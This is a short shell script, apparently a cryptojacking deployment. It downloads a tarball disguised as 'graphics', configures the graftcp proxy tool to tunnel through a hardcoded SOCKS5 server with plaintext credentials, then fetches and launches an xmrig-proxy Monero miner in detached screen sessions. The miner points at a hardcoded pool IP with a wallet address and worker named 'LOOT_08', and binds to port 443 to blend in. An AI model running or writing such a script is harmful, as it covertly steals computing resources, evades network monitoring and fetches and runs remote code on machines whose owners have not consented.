#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 31.171.241.147:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

screen -d -m ./graftcp/graftcp wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.20.0/xmrig-proxy-6.20.0-linux-x64.tar.gz && tar -xf xmrig-proxy-6.20.0-linux-x64.tar.gz && cd xmrig-proxy-6.20.0 && screen -d -m ./xmrig-proxy -a rx/0 -r 2 -R 1 --donate-level 0 -o stratum+ssl://34.149.22.228:443 -m simple -u 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.LOOT_08 -p x --bind 0.0.0.0:443
